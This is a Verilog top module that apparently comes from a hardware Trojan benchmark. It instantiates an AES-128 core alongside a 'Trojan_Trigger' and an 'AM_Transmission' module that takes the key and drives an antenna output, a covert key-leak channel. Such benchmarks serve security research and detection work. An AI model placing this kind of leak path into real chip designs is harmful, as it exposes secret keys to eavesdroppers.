`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company:
// Engineer:
//
// Create Date:    12:55:51 03/08/2013
// Design Name:
// Module Name:    top
// Project Name:
// Target Devices:
// Tool versions:
// Description:
//
// Dependencies:
//
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    output [7:0] res);
    reg [63:0] state;
    reg [63:0] key;
    reg [63:0] result;
    wire [63:0] Capacitance;

    wire Antena;
    wire Tj_Trig;

    always @(posedge clk)
    begin
      state <= 64'd0;
      key <= 64'd0;;
    end

    assign statew = state;
    assign keyw = key;

    bufferin bi(.clk(clk)
    ,.statein(statew)
    ,.keyin(keyw)
    ,.stateout(statebi)
    ,.keyout(keybi));

  	aes_128 AES (clk, statebi, keybi, out);
  	Trojan_Trigger Tj_Trigger (rst, clk, statebi, Tj_Trig);
    AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);

    bufferout bo(.clk(clk)
      ,.resultin(out)
      ,.capin(Antena)
      ,.resultout(res));

endmodule
